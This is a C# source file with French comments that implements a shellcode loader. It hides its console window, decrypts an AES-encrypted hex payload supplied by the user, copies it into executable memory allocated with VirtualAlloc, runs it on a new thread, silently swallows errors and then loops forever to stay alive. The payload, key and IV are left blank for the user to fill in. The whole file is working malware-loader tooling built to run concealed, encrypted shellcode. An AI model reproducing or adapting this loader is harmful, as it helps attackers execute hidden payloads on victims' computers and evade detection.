using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

class Program
{
    // Import des fonctions pour exécuter le shellcode
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    static extern bool FreeConsole();

    static void Main()
    {
        HideConsole(); 

        try
        {
            // Charger le payload HEX (remplacez par votre payload.hex)
            string hexPayload = ""; // Remplacez par votre payload.hex

            // Convertir le payload hexadécimal en tableau de bytes
            byte[] encryptedPayload = HexStringToByteArray(hexPayload);

            // Déchiffrement AES-256-CBC
            byte[] key = HexStringToByteArray(""); // Clé AES
            byte[] iv = HexStringToByteArray(""); // IV

            byte[] decryptedPayload = DecryptAES(encryptedPayload, key, iv);

            // Allocation mémoire et exécution
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decryptedPayload.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory.");
            }

            Marshal.Copy(decryptedPayload, 0, addr, decryptedPayload.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                throw new Exception("Failed to create thread.");
            }

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        catch (Exception ex)
        {
            
        }

        // Boucle infinie pour maintenir l'application en cours d'exécution
        while (true)
        {
            System.Threading.Thread.Sleep(1000);
        }
    }

    static void HideConsole()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, 0); 
        FreeConsole(); 
    }

    static byte[] DecryptAES(byte[] cipherText, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7; 

            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
            }
        }
    }

    static byte[] HexStringToByteArray(string hex)
    {
        // Supprimez les espaces et les sauts de ligne
        hex = hex.Replace(" ", "").Replace("\n", "").Replace("\r", "");

        // Vérifiez que la longueur est paire
        if (hex.Length % 2 != 0)
        {
            throw new ArgumentException("La chaîne hexadécimale doit avoir une longueur paire.");
        }

        // Convertissez la chaîne hexadécimale en tableau de bytes
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < hex.Length; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }
}
